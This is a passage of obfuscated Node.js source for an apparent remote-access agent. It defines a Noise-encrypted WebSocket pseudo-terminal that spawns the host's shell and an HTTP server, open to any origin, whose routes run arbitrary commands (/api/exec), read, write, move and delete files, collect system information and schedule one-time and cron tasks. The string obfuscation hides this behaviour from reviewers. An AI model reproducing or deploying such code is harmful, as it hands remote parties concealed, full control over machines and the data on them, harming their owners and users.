        a && b['hINvW'](a[bk(0x4e9)], 0x0) && b[bk(0x369)](this['hs']['GetAction'](), c[bk(0x41d)][bk(0x406)]) && this['hs'][bk(0x2c2)](a);
        if (this['hs'][bk(0x2cc)]() === c[bk(0x41d)][bk(0x220)])
            return this[bk(0x3e7)](), Buffer[bk(0x36b)](0x0);
        if (this['hs']['GetAction']() === c[bk(0x41d)]['NOISE_ACTION_WRITE_MESSAGE']) {
            const d = this['hs'][bk(0x499)](new Uint8Array(0x0));
            return b['UkMfi'](this['hs']['GetAction'](), c['constants']['NOISE_ACTION_SPLIT']) && this[bk(0x3e7)](), Buffer[bk(0x2d9)](d);
        }
        return Buffer[bk(0x36b)](0x0);
    }
    [a0T(0x3e7)]() {
        const bl = a0T, a = this['hs'][bl(0x215)]();
        this['sendCipher'] = a[0x0], this[bl(0x228)] = a[0x1], this['handshakeFinished'] = !![];
        try {
            if (this['hs'])
                this['hs'][bl(0x411)]();
        } catch (b) {
        }
        this['hs'] = null;
    }
    [a0T(0x3ee)](a) {
        const bm = a0T, b = { 'ECyTR': bm(0x3f1) };
        if (!this[bm(0x3b7)])
            throw new Error(b[bm(0x491)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[bm(0x2d9)](this['sendCipher'][bm(0x44e)](c, d));
    }
    [a0T(0x29a)](a) {
        const bn = a0T, b = { 'dOHKa': '握手未完成，无法解密数据' };
        if (!this['handshakeFinished'])
            throw new Error(b[bn(0x3a8)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer['from'](this[bn(0x228)][bn(0x3f8)](c, d));
    }
    [a0T(0x411)]() {
        const bo = a0T;
        try {
            if (this[bo(0x284)])
                this[bo(0x284)][bo(0x411)]();
        } catch (a) {
        }
        try {
            if (this[bo(0x228)])
                this[bo(0x228)][bo(0x411)]();
        } catch (b) {
        }
        try {
            if (this['hs'])
                this['hs'][bo(0x411)]();
        } catch (c) {
        }
        this[bo(0x284)] = null, this[bo(0x228)] = null, this['hs'] = null;
    }
}
function a0b(a, b) {
    a = a - 0x1d7;
    const c = a0a();
    let d = c[a];
    if (a0b['jksAYv'] === undefined) {
        var e = function (i) {
            const j = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let l = '', m = '';
            for (let n = 0x0, o, p, q = 0x0; p = i['charAt'](q++); ~p && (o = n % 0x4 ? o * 0x40 + p : p, n++ % 0x4) ? l += String['fromCharCode'](0xff & o >> (-0x2 * n & 0x6)) : 0x0) {
                p = j['indexOf'](p);
            }
            for (let r = 0x0, s = l['length']; r < s; r++) {
                m += '%' + ('00' + l['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(m);
        };
        a0b['tNnOKi'] = e, a0b['oHvioI'] = {}, a0b['jksAYv'] = !![];
    }
    const f = c[0x0], g = a + f, h = a0b['oHvioI'][g];
    return !h ? (d = a0b['tNnOKi'](d), a0b['oHvioI'][g] = d) : d = h, d;
}
class a0P {
    constructor() {
        const bp = a0T, a = { 'XRPLB': bp(0x3dd) }, b = a['XRPLB'][bp(0x42e)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['websocket'] = null;
                continue;
            case '1':
                this['ptyProcess'] = null;
                continue;
            case '2':
                this['msgQueue'] = [];
                continue;
            case '3':
                this[bp(0x253)] = !![];
                continue;
            case '4':
                this['cipher'] = new a0O(![], this[bp(0x20b)], this['CONTROL_PUBLIC_KEY']);
                continue;
            case '5':
                this[bp(0x22b)] = bp(0x422);
                continue;
            case '6':
                this[bp(0x20b)] = a0E[bp(0x3bc)][bp(0x471)][bp(0x34b)];
                continue;
            case '7':
                this[bp(0x45b)] = [];
                continue;
            case '8':
                this[bp(0x40f)] = null;
                continue;
            case '9':
                this[bp(0x24c)] = a0E[bp(0x3bc)]['control'][bp(0x462)];
                continue;
            }
            break;
        }
    }
    async [a0T(0x2dd)]() {
        const bq = a0T, a = { 'OMvHW': bq(0x3ae) };
        this[bq(0x40f)] && a0u[bq(0x4a2)]('[' + this[bq(0x40f)] + bq(0x478));
        if (this[bq(0x243)]) {
            try {
                this['ptyProcess'][bq(0x2e6)]();
            } catch (b) {
            }
            this[bq(0x243)] = null;
        }
        if (this[bq(0x2ee)])
            this['cipher'][bq(0x411)]();
        if (this[bq(0x42c)])
            try {
                this[bq(0x42c)]['readyState'] === this[bq(0x42c)][bq(0x2d4)] && this[bq(0x42c)]['close'](0x3e8, a['OMvHW']);
            } catch (c) {
            } finally {
                this[bq(0x42c)] = null;
            }
    }
    [a0T(0x1f3)](a) {
        const br = a0T, b = {
                'HCxbN': function (c, d) {
                    return c === d;
                },
                'JVgpW': br(0x422),
                'XRIqd': function (c, d) {
                    return c > d;
                },
                'fiwhi': function (c, d) {
                    return c(d);
                }
            };
        if (b[br(0x3c3)](this[br(0x22b)], b[br(0x43a)])) {
            if (b['XRIqd'](this[br(0x45b)][br(0x4e9)], 0x0)) {
                const c = this['msgResolvers'][br(0x446)]();
                b[br(0x448)](c, a);
            } else
                this['msgQueue'][br(0x4d2)](a);
        } else
            b[br(0x3c3)](this['phase'], 'terminal') && this[br(0x20a)](a);
    }
    async [a0T(0x2ac)]() {
        const bs = a0T, a = {
                'PyXgQ': function (b, c) {
                    return b > c;
                }
            };
        if (a[bs(0x235)](this[bs(0x4db)][bs(0x4e9)], 0x0))
            return this['msgQueue'][bs(0x446)]();
        return new Promise(b => {
            const bt = bs;
            this[bt(0x45b)][bt(0x4d2)](b);
        });
    }
    async ['_doNoiseHandshake'](a) {
        const bu = a0T, b = {
                'sjVDB': function (c, d) {
                    return c(d);
                },
                'uJuDH': '🤝\x20开始\x20Noise\x20加密握手...',
                'VzXwP': function (c, d) {
                    return c > d;
                },
                'akPgG': bu(0x36c),
                'EJMCg': bu(0x345),
                'fDyEn': bu(0x28c)
            };
        b[bu(0x1f1)](a, b[bu(0x443)]);
        try {
            await this[bu(0x2ee)][bu(0x3b3)]();
            const c = await this[bu(0x2ac)](), d = this[bu(0x2ee)][bu(0x2d0)](c);
            d && b['VzXwP'](d['length'], 0x0) && this[bu(0x42c)]['send'](d);
            const f = await this[bu(0x2ac)]();
            this['cipher'][bu(0x2d0)](f);
            if (!this[bu(0x2ee)][bu(0x3b7)])
                throw new Error(b['akPgG']);
            b[bu(0x1f1)](a, b[bu(0x35c)]);
        } catch (g) {
            a(bu(0x2e5) + g['message']);
            throw new Error(b[bu(0x39a)]);
        }
    }
    [a0T(0x3f4)]() {
        const bv = a0T, a = {
                'uEmlV': '/bin/bash',
                'XkQlx': '/bin/zsh',
                'fJhrg': '/bin/sh'
            }, b = process.env.SHELL;
        if (b && a0h[bv(0x2bf)](b))
            return b;
        const c = [
            a[bv(0x226)],
            a[bv(0x436)],
            '/bin/ash',
            bv(0x4aa)
        ];
        for (const d of c) {
            if (a0h[bv(0x2bf)](d))
                return d;
        }
        return a[bv(0x45a)];
    }
    async [a0T(0x46e)](a, b, c) {
        const bw = a0T, d = {
                'FvpQK': function (g, h) {
                    return g(h);
                },
                'OgsNE': '🔗\x20检测到\x20WS\x20连接，启用\x20Noise\x20加密',
                'jJpwC': bw(0x4af),
                'hwKjL': bw(0x476)
            };
        this[bw(0x42c)] = a, this[bw(0x40f)] = b;
        const f = g => a0u[bw(0x4a2)](bw(0x4cf) + b + ']\x20' + g);
        this[bw(0x253)] = !c, d[bw(0x25d)](f, this[bw(0x253)] ? d['OgsNE'] : d['jJpwC']), a['on'](d[bw(0x2e9)], g => this['_handleRawMessage'](g));
        try {
            this[bw(0x253)] && await this[bw(0x4c2)](f), await this['_runTerminal'](f);
        } catch (g) {
            f(bw(0x1da) + g[bw(0x476)]), await this[bw(0x2dd)]();
        }
    }
    async ['_runTerminal'](a) {
        const bx = a0T, b = {
                'LSmsl': bx(0x3dc),
                'vcrvW': function (f, g) {
                    return f === g;
                },
                'xSoja': function (f, g) {
                    return f(g);
                },
                'QDuMI': bx(0x394),
                'Bmmjx': function (f, g) {
                    return f(g);
                },
                'RKdXP': bx(0x259),
                'BLtsE': bx(0x36a),
                'JMfiu': function (f, g) {
                    return f(g);
                },
                'XdPfp': bx(0x4ba),
                'fYsvg': bx(0x21c),
                'ZkyNE': function (f, g) {
                    return f > g;
                },
                'WiysS': function (f, g) {
                    return f(g);
                }
            }, c = this[bx(0x3f4)]();
        b['Bmmjx'](a, bx(0x47a) + c);
        const d = Object[bx(0x4b8)]({}, process.env);
        delete d[bx(0x213)], d[bx(0x2d3)] = b[bx(0x217)];
        if (!d[bx(0x2fd)])
            d[bx(0x2fd)] = b[bx(0x2fb)];
        try {
            this[bx(0x243)] = a0t['spawn'](c, [], {
                'name': bx(0x259),
                'cols': 0x50,
                'rows': 0x18,
                'cwd': process.env.HOME || process['cwd'](),
                'env': d
            }), b[bx(0x335)](a, bx(0x43f) + (this[bx(0x243)][bx(0x430)] || b[bx(0x364)]) + ')'), this['phase'] = b[bx(0x486)];
            while (b[bx(0x353)](this[bx(0x4db)][bx(0x4e9)], 0x0)) {
                const f = this[bx(0x4db)][bx(0x446)]();
                this[bx(0x20a)](f);
            }
            this['ptyProcess'][bx(0x25b)](g => {
                const by = bx;
                try {
                    let h = Buffer[by(0x2d9)](g, b['LSmsl']);
                    this[by(0x253)] && this[by(0x2ee)] && this[by(0x2ee)][by(0x3b7)] && (h = this[by(0x2ee)][by(0x3ee)](h)), b[by(0x230)](this[by(0x42c)][by(0x351)], 0x1) && this['websocket'][by(0x39c)](h);
                } catch (i) {
                }
            }), this['ptyProcess'][bx(0x2a5)](({
                exitCode: g,
                signal: h
            }) => {
                const bz = bx;
                b[bz(0x323)](a, bz(0x2bc) + g + bz(0x4a6) + h + ')'), this[bz(0x2dd)]();
            }), this[bx(0x42c)]['on'](bx(0x22a), () => {
                const bA = bx;
                b[bA(0x323)](a, b[bA(0x4e6)]), this[bA(0x2dd)]();
            });
        } catch (g) {
            b[bx(0x29f)](a, bx(0x218) + g['message']), await this['cleanup']();
            throw g;
        }
    }
    ['_processTerminalMessage'](a) {
        const bB = a0T, b = {
                'lYMmJ': 'utf-8',
                'tsgZD': bB(0x407),
                'uycLC': function (c, d) {
                    return c === d;
                },
                'VwmlU': 'resize',
                'trDoE': function (c, d) {
                    return c === d;
                },
                'BqADn': bB(0x313),
                'yOTuP': function (c, d) {
                    return c !== d;
                },
                'JXmhR': function (c, d) {
                    return c === d;
                },
                'KWGtM': bB(0x4ce)
            };
        if (!this[bB(0x243)])
            return;
        try {
            const c = Buffer[bB(0x2d9)](a);
            let d;
            this['useNoise'] ? d = this['cipher'][bB(0x29a)](c) : d = c;
            let f = ![], g = d[bB(0x1d7)](b[bB(0x1fc)]);
            if (g['trim']()[bB(0x207)]('{'))
                try {
                    const h = JSON['parse'](g);
                    f = !![];
                    if (h[bB(0x4ed)] === b[bB(0x4d8)]) {
                        let i = Buffer[bB(0x2d9)](JSON[bB(0x47f)]({ 'type': b[bB(0x4d8)] }));
                        if (this[bB(0x253)])
                            i = this['cipher']['encrypt'](i);
                        this['websocket'][bB(0x39c)](i);
                        return;
                    }
                    if (b[bB(0x35e)](h[bB(0x4ed)], b[bB(0x4d3)])) {
                        this[bB(0x243)][bB(0x31e)](h[bB(0x36e)] || 0x50, h['rows'] || 0x18);
                        return;
                    }
                    if (b[bB(0x1df)](h['type'], b['BqADn']) && b[bB(0x375)](h[bB(0x214)], undefined)) {
                        let j = b['JXmhR'](h[bB(0x1f5)], b[bB(0x300)]) ? Buffer[bB(0x2d9)](h['data'], b['KWGtM'])['toString'](b['lYMmJ']) : h[bB(0x214)];
                        this[bB(0x243)][bB(0x455)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[bB(0x243)][bB(0x455)](d[bB(0x1d7)](b[bB(0x1fc)]));
        } catch (l) {
            a0u[bB(0x4a2)](bB(0x4cf) + this[bB(0x40f)] + ']\x20⚠️\x20指令处理异常:\x20' + l[bB(0x476)]);
            if (this[bB(0x253)])
                this[bB(0x2dd)]();
        }
    }
}
async function a0Q(a = {}) {
    const bC = a0T, b = {
            'jpSUQ': bC(0x244),
            'kZTrN': 'Access-Control-Allow-Headers',
            'vpkMO': bC(0x2a2),
            'TxFyU': bC(0x2dc),
            'Zzxnh': function (c, d) {
                return c === d;
            },
            'KGVbS': bC(0x298),
            'ytriG': function (c) {
                return c();
            },
            'LHXpY': '1|3|0|4|2',
            'xgcZI': bC(0x1fd),
            'rLdcm': function (c, d) {
                return c > d;
            },
            'rvrML': bC(0x202),
            'WoBCq': bC(0x356),
            'gmORM': '3|1|4|2|0',
            'yEPQm': bC(0x3cd),
            'CqIVU': function (c, d) {
                return c / d;
            },
            'dxCFC': function (c, d) {
                return c > d;
            },
            'aIJvY': function (c, d) {
                return c - d;
            },
            'APbnh': bC(0x48f),
            'fKTei': bC(0x3a1),
            'FHYqw': 'cmd\x20required',
            'bpTZg': function (c, d) {
                return c === d;
            },
            'Afevz': bC(0x4ce),
            'UzNCV': bC(0x285),
            'oQnjm': 'content-type',
            'nKLGN': bC(0x309),
            'tKnME': function (c, d, f) {
                return c(d, f);
            },
            'rbpbN': function (c, d, f) {
                return c(d, f);
            },
            'SPSiQ': bC(0x432),
            'pGXFY': bC(0x38c),
            'OmtlH': bC(0x2e8),
            'CEhoB': 'Config\x20validated',
            'YEdVh': bC(0x3a6),
            'hutWT': bC(0x256),
            'uDpIE': function (c, d) {
                return c(d);
            },
            'rcqPU': bC(0x3ff),
            'uvTAb': 'Middleware\x20applied,\x20setting\x20up\x20routes...',
            'GIdYA': bC(0x318),
            'HVkPY': '/api/exec',
            'nZzBg': bC(0x2fc),
            'wwaNG': '/api/file/authority',
            'NKVdf': '/api/file/cat',
            'fGsRH': bC(0x25f),
            'YqyEi': bC(0x3b4),
            'gWsft': bC(0x3d2),
            'ZbdjN': bC(0x1f9),
            'YxhiL': '/api/task/onetime',
            'RSeLF': '/api/task/cron',
            'UzTwj': '/api/task/status',
            'THENz': bC(0x49b),
            'UMuFJ': '/api/task/log/cron',
            'eEJYB': bC(0x21b),
            'mdWBX': bC(0x2c4),
            'aBaoY': 'Starting\x20HTTP\x20server...',
            'OYTGI': 'SIGINT',
            'BEWZe': bC(0x2c5)
        };
    try {
        const c = await import(b['pGXFY']);
        a0s = c[bC(0x1db)], a0u[bC(0x1ff)](b['OmtlH']), a0E[bC(0x33c)](a), a0u['debug'](bC(0x4c3)), a0E[bC(0x297)](), a0u[bC(0x1ff)](b[bC(0x367)]), a0u[bC(0x1ff)](b[bC(0x236)]);
        const d = new a0F(a0E['ECDSA_PUBLIC_KEY_PEM'], a0E[bC(0x3ad)]);
        a0u['debug']('CryptoManager\x20initialized'), a0u[bC(0x1ff)](bC(0x3d8));
        const f = new a0H();
        a0u[bC(0x1ff)](bC(0x1e7)), a0u[bC(0x1ff)](b['hutWT']);
        const g = a0f();
        b[bC(0x4ad)](a0q, g), a0u[bC(0x1ff)](bC(0x32b)), g[bC(0x1d9)]((i, j, k) => {
            const bD = bC;
            j[bD(0x1e3)](bD(0x3ca), '*'), j[bD(0x1e3)](b[bD(0x41c)], 'GET,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS'), j[bD(0x1e3)](b[bD(0x2b4)], b['vpkMO']), j['header'](bD(0x24e), b[bD(0x461)]);
            if (b[bD(0x2a1)](i[bD(0x489)], b[bD(0x334)]))
                return j[bD(0x470)](0xc8)[bD(0x2d5)]();
            b[bD(0x419)](k);
        }), g['use'](a0f[bC(0x239)]({
            'type': () => !![],
            'limit': b[bC(0x311)]
        })), g['use'](a0f[bC(0x3c9)]({ 'extended': !![] })), g[bC(0x1d9)](b[bC(0x4ad)](a0G, d)), a0u[bC(0x1ff)](b[bC(0x205)]), g[bC(0x224)](bC(0x399), async (i, j) => {
            const bE = bC, k = {
                    'Sgync': b[bE(0x357)],
                    'HhagD': b[bE(0x2f5)]
                };
            try {
                const l = Math[bE(0x4a9)](Date[bE(0x48c)]() / 0x3e8);
                !a0E['_baseinfo_cache'] || b[bE(0x358)](l - a0E['_baseinfo_cache_time'], a0E[bE(0x447)]) ? (!a0E[bE(0x328)] && (a0E[bE(0x328)] = f['getBasicInfo']()[bE(0x31a)](n => {
                    const bF = bE, o = k[bF(0x42f)][bF(0x42e)]('|');
                    let p = 0x0;
                    while (!![]) {
                        switch (o[p++]) {
                        case '0':
                            a0E[bF(0x328)] = null;
                            continue;
                        case '1':
                            a0E[bF(0x4f5)] = n;
                            continue;
                        case '2':
                            return n;
                        case '3':
                            a0E[bF(0x2e1)] = Math['floor'](Date['now']() / 0x3e8);
                            continue;
                        case '4':
                            a0u['debug'](k[bF(0x33f)]);
                            continue;
                        }
                        break;
                    }
                })['catch'](n => {
                    const bG = bE;
                    a0E[bG(0x328)] = null;
                    throw n;
                })), await a0E[bE(0x328)]) : a0u[bE(0x1ff)](b[bE(0x34f)]);
                const m = { ...a0E['_baseinfo_cache'] };
                i[bE(0x4d4)] === ![] ? (m[bE(0x251)] = null, m['noise_key'] = null) : (m[bE(0x251)] = a0E[bE(0x4be)], m[bE(0x39e)] = a0E[bE(0x2df)]), j[bE(0x4c0)](m);
            } catch (n) {
                j[bE(0x470)](0x1f4)[bE(0x4c0)]({
                    'status': b[bE(0x258)],
                    'message': n[bE(0x476)]
                });
            }
        }), g[bC(0x224)](b[bC(0x3e0)], async (i, j) => {
            const bH = bC, k = {
                    'EVKxh': b[bH(0x3da)],
                    'JXGMa': function (l, m) {
                        return l / m;
                    },
                    'ywFPK': b[bH(0x4c4)]
                };
            try {
                const l = Math[bH(0x4a9)](b['CqIVU'](Date[bH(0x48c)](), 0x3e8));
                !a0E['_status_cache'] || b[bH(0x206)](b['aIJvY'](l, a0E[bH(0x393)]), a0E[bH(0x4d5)]) ? (!a0E['_status_fetch_promise'] && (a0E[bH(0x4ec)] = f[bH(0x37d)]()[bH(0x31a)](n => {
                    const bI = bH, o = k[bI(0x4b6)][bI(0x42e)]('|');
                    let p = 0x0;
                    while (!![]) {
                        switch (o[p++]) {
                        case '0':
                            return n;
                        case '1':
                            a0E[bI(0x393)] = Math[bI(0x4a9)](k[bI(0x4b2)](Date[bI(0x48c)](), 0x3e8));
                            continue;
                        case '2':
                            a0u[bI(0x1ff)](k['ywFPK']);
                            continue;
                        case '3':
                            a0E['_status_cache'] = n;
                            continue;
                        case '4':
                            a0E[bI(0x4ec)] = null;
                            continue;
                        }
                        break;
                    }
                })[bH(0x1ea)](n => {
                    const bJ = bH;
                    a0E[bJ(0x4ec)] = null;
                    throw n;
                })), await a0E[bH(0x4ec)]) : a0u[bH(0x1ff)](bH(0x2a9));
                const m = { ...a0E['_status_cache'] };
                j['json'](m);
            } catch (n) {
                j['status'](0x1f4)[bH(0x4c0)]({
                    'status': b[bH(0x258)],
                    'message': n[bH(0x476)]
                });
            }
        }), g[bC(0x480)](b[bC(0x1ed)], async (i, j) => {
            const bK = bC;
            try {
                let k = null;
                if (b['Zzxnh'](typeof i[bK(0x4f1)], b['APbnh']))
                    k = i[bK(0x4f1)]['trim']();
                else
                    i[bK(0x4f1)] && b['Zzxnh'](typeof i['body'], b[bK(0x467)]) && (k = i[bK(0x4f1)][bK(0x22e)] || '');
                if (!k)
                    return j[bK(0x470)](0x190)[bK(0x4c0)]({
                        'status': b[bK(0x258)],
                        'message': b['FHYqw']
                    });
                const l = await a0I[bK(0x392)](k, {
                    'cwd': i[bK(0x4f1)]['cwd'],
                    'env': i[bK(0x4f1)][bK(0x33b)],
                    'timeout': a0E[bK(0x384)]
                });
                j['json'](l);
            } catch (m) {
                j[bK(0x470)](0x1f4)[bK(0x4c0)]({
                    'status': b[bK(0x258)],
                    'message': m['message']
                });
            }
        }), g[bC(0x480)](b[bC(0x2b1)], async (i, j) => {
            const bL = bC;
            try {
                const k = await a0J['listFiles'](i['body']['path'], i[bL(0x4f1)][bL(0x307)]);
                j[bL(0x4c0)]({
                    'status': 'ok',
                    'count': k[bL(0x4e9)],
                    'files': k
                });
            } catch (l) {
                j[bL(0x470)](0x1f4)[bL(0x4c0)]({
                    'status': bL(0x356),
                    'message': l['message']
                });
            }
        }), g[bC(0x480)](bC(0x245), async (i, j) => {
            const bM = bC;
            try {
                const k = await a0J['getFilePermissions'](i[bM(0x4f1)][bM(0x490)] || []);
                j[bM(0x4c0)]({
                    'status': 'ok',
                    'files': k
                });
            } catch (l) {
                j[bM(0x470)](0x1f4)[bM(0x4c0)]({
                    'status': 'error',
                    'message': l[bM(0x476)]
                });
            }
        }), g[bC(0x46a)](b[bC(0x249)], async (i, j) => {
            const bN = bC;
            try {
                const k = i[bN(0x4f1)][bN(0x23a)] || {}, l = b[bN(0x391)](i['body'][bN(0x307)], !![]), m = await a0J[bN(0x397)](k, l);
                j[bN(0x4c0)](m);
            } catch (n) {
                j[bN(0x470)](0x1f4)['json']({
                    'status': b[bN(0x258)],
                    'message': n[bN(0x476)]
                });
            }
        }), g[bC(0x480)](b[bC(0x3a2)], async (i, j) => {
            const bO = bC;
            try {
                const k = await a0J[bO(0x44b)](i[bO(0x4f1)][bO(0x4e2)]);
                j['json'](k);
            } catch (l) {
                j[bO(0x470)](0x1f4)[bO(0x4c0)]({
                    'status': b[bO(0x258)],
                    'message': l[bO(0x476)]
                });
            }
        }), g[bC(0x480)](b[bC(0x2a4)], async (i, j) => {
            const bP = bC;
            try {
                const k = await a0J[bP(0x496)](i[bP(0x4f1)][bP(0x4e2)], i['body'][bP(0x4a7)], i[bP(0x4f1)][bP(0x252)], i[bP(0x4f1)]['chunk_id'], i[bP(0x4f1)][bP(0x234)]);
                j['json'](k);
            } catch (l) {
                j[bP(0x470)](0x1f4)[bP(0x4c0)]({
                    'status': bP(0x356),
                    'message': l['message']
                });
            }
        }), g[bC(0x480)](b[bC(0x248)], async (i, j) => {
            const bQ = bC;
            try {
                const k = await a0J[bQ(0x211)](i[bQ(0x4f1)][bQ(0x4e2)]), l = Buffer[bQ(0x2d9)](k[bQ(0x252)], b[bQ(0x48d)]);
                return j[bQ(0x4d0)](bQ(0x1f4), k[bQ(0x3ab)]['toString']()), j[bQ(0x4d0)](b[bQ(0x327)], k[bQ(0x4e2)]), j['set'](b[bQ(0x270)], b[bQ(0x44d)]), j[bQ(0x39c)](l);
            } catch (m) {
                j['status'](0x1f4)[bQ(0x4c0)]({
                    'status': b[bQ(0x258)],
                    'message': m[bQ(0x476)]
                });
            }
        }), g[bC(0x3aa)](b['fGsRH'], async (i, j) => {
            const bR = bC;
            try {
                let k = i[bR(0x4f1)][bR(0x490)];
                if (!k || !Array[bR(0x388)](k)) {
                    k = [];
                    if (i['body'][bR(0x4e2)])
                        k[bR(0x4d2)](i[bR(0x4f1)][bR(0x4e2)]);
                    if (i['body'][bR(0x4ae)])
                        k[bR(0x4d2)](i['body']['path2']);
                }
                const l = await a0J[bR(0x420)](k);
                j[bR(0x4c0)]({
                    'status': 'ok',
                    'results': l
                });
            } catch (m) {
                j[bR(0x470)](0x1f4)['json']({
                    'status': b['WoBCq'],
                    'message': m['message']
                });
            }
        }), g[bC(0x46a)](b[bC(0x2a4)], async (i, j) => {
            const bS = bC;
            try {
                const k = await a0J['moveFiles'](i[bS(0x4f1)][bS(0x3a3)] || i[bS(0x4f1)]);
                j['json']({
                    'status': 'ok',
                    'total': k[bS(0x4e9)],
                    'success': k[bS(0x465)](l => l[bS(0x470)] === 'ok')[bS(0x4e9)],
                    'results': k
                });
            } catch (l) {
                j[bS(0x470)](0x1f4)['json']({
                    'status': b[bS(0x258)],
                    'message': l[bS(0x476)]
                });
            }
        }), g[bC(0x480)](b[bC(0x416)], async (i, j) => {
            const bT = bC;
            try {
                const k = await a0J[bT(0x4ac)](i[bT(0x4f1)]);
                j[bT(0x4c0)]({
                    'status': 'ok',
                    'total': k[bT(0x4e9)],
                    'success': k[bT(0x465)](l => l['status'] === 'ok')[bT(0x4e9)],
                    'results': k
                });
            } catch (l) {
                j['status'](0x1f4)[bT(0x4c0)]({
                    'status': b[bT(0x258)],
                    'message': l[bT(0x476)]
                });
            }
        }), g['post'](b['ZbdjN'], async (i, j) => {
            const bU = bC;
            try {
                const k = await a0J[bU(0x24d)](i[bU(0x4f1)][bU(0x4e2)]);
                j[bU(0x4c0)](k);
            } catch (l) {
                j[bU(0x470)](0x1f4)[bU(0x4c0)]({
                    'status': b[bU(0x258)],
                    'message': l[bU(0x476)]
                });
            }
        }), g[bC(0x224)](b['YxhiL'], (i, j) => {
            const bV = bC;
            j[bV(0x4c0)](a0K['getOnetimeTasks']());
        }), g['post'](b['YxhiL'], async (i, j) => {
            const bW = bC;
            try {
                const k = await a0K['setOnetimeTasks'](i[bW(0x4f1)]);
                j[bW(0x4c0)](k);
            } catch (l) {
                j[bW(0x470)](0x1f4)['json']({
                    'status': b[bW(0x258)],
                    'message': l[bW(0x476)]
                });
            }
        }), g[bC(0x224)](b['RSeLF'], (i, j) => {
            const bX = bC;
            j[bX(0x4c0)](a0K[bX(0x27c)]());
        }), g[bC(0x480)](b[bC(0x4ca)], (i, j) => {
            const bY = bC;
            try {
                const k = a0K[bY(0x444)](i[bY(0x4f1)]);
                j['json'](k);
            } catch (l) {
                j[bY(0x470)](0x1f4)[bY(0x4c0)]({
                    'status': b['WoBCq'],
                    'message': l['message']
                });
            }
        }), g['get'](b['UzTwj'], (i, j) => {
            j['json'](a0K['getTaskStatus']());
        }), g[bC(0x224)](b[bC(0x28b)], (i, j) => {
            const bZ = bC;
            let k = b[bZ(0x23c)](parseInt, i[bZ(0x23f)][bZ(0x412)], 0xa) || 0x32;
            k = Math[bZ(0x3e9)](Math[bZ(0x42b)](k, 0x1), 0x64), j[bZ(0x4c0)](a0K[bZ(0x2f7)](k));
        }), g['get'](bC(0x1f2), (i, j) => {
            const c0 = bC;
            let k = b['rbpbN'](parseInt, i[c0(0x23f)][c0(0x412)], 0xa) || 0x32;
            k = Math[c0(0x3e9)](Math[c0(0x42b)](k, 0x1), 0x64), j[c0(0x4c0)](a0K['getCronLogs'](k));
        }), g[bC(0x3aa)](bC(0x49b), (i, j) => {
            const c1 = bC;
            j[c1(0x4c0)](a0K[c1(0x44f)]());
        }), g['delete'](b[bC(0x30c)], (i, j) => {
            const c2 = bC;
            j[c2(0x4c0)](a0K[c2(0x361)]());
        }), g[bC(0x224)]('/api/task/log/summary', (i, j) => {
            const c3 = bC;
            j[c3(0x4c0)](a0K[c3(0x266)]());
        }), g[bC(0x480)](b['eEJYB'], async (i, j) => {
            const c4 = bC;
            try {
                const k = await a0K['executeOnetimeTasks']();
                j['json'](k);
            } catch (l) {
                j[c4(0x470)](0x1f4)['json']({
                    'status': b[c4(0x258)],
                    'message': l[c4(0x476)]
                });
            }
        }), a0u[bC(0x1ff)](bC(0x2a0)), g['ws'](bC(0x222), async (i, j) => {
            const c5 = bC, k = j[c5(0x47e)][0x0];
            a0u[c5(0x1ff)]('WebSocket\x20request\x20URL:\x20' + j[c5(0x321)]), a0u[c5(0x1ff)](c5(0x2a8) + k);
            const l = j['query'][c5(0x473)], m = j[c5(0x23f)][c5(0x431)];
            a0u['debug']('WebSocket\x20connection\x20attempt\x20with\x20request_id:\x20' + l);
            if (!l) {
                a0u[c5(0x1ff)](b[c5(0x427)]), i[c5(0x22a)](0x3f0, c5(0x360));
                return;
            }
            const n = new a0P();
            await n[c5(0x46e)](i, l, m);
        }), a0u[bC(0x1ff)](b[bC(0x22f)]), a0u[bC(0x1ff)](b[bC(0x2ce)]);
        const h = g[bC(0x348)](a0E[bC(0x421)], a0E['HOST'], () => {
            const c6 = bC;
            a0u['debug'](c6(0x2eb) + a0E[c6(0x30a)] + c6(0x1e4) + a0E['HOST'] + ':' + a0E[c6(0x421)]), a0u[c6(0x1ff)](c6(0x484));
        });
        process['on'](b[bC(0x3a9)], () => {
            const c7 = bC;
            a0u[c7(0x1ff)](c7(0x272)), h[c7(0x22a)](), process['exit'](0x0);
        }), a0u['debug'](b[bC(0x459)]);
    } catch (i) {
        a0u[bC(0x356)](bC(0x3d1), i), process[bC(0x317)](0x1);
    }
}
(require[a0T(0x20c)] === module || require['main']?.[a0T(0x4a7)]?.[a0T(0x376)](a0T(0x29c))) && a0Q()[a0T(0x1ea)](a0u[a0T(0x356)]);
module['exports'] = {
    'main': a0Q,
    'Config': a0E,
    'CryptoManager': a0F,
    'SystemInfoCollector': a0H,
    'CommandExecutor': a0I,
    'FileManager': a0J,
    'TaskManager': a0K
};